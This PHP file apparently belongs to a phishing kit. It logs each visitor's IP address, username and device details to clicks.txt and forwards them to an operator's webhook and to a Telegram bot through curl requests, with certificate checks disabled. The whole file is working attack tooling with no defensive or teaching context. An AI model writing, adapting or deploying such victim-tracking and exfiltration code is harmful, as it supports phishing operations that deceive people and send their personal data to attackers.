<?php

require_once 'main.php';
require_once 'config/settings.php';

  $ip = getenv("REMOTE_ADDR");
   $agnet = $_SERVER['HTTP_USER_AGENT'];
   
$message .= "||" . $UserName . "||\n";
   $message .= "\n";
   $message .= "➡️ $ip - $cn - $os - $br - $date\n";
   
   $save=fopen("clicks.txt","a+");
    fwrite($save,$message);
    fclose($save);
    $url = "" . $Server_Webhook . "";
   $headers = ['Content-Type: application/json; charset=utf-8'];
   $POST = ['username' => 'Quartz', 'content' => $message];
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
   curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
   $response = curl_exec($ch);
   $apiUrl = "https://api.telegram.org/bot$http_api/sendMessage";
   $params = ['chat_id' => $chat_id, 'text' => $message];
   $queryString = http_build_query($params);
   
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, "$apiUrl?$queryString");
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   $result = curl_exec($ch);
   curl_close($ch);
   
   ?>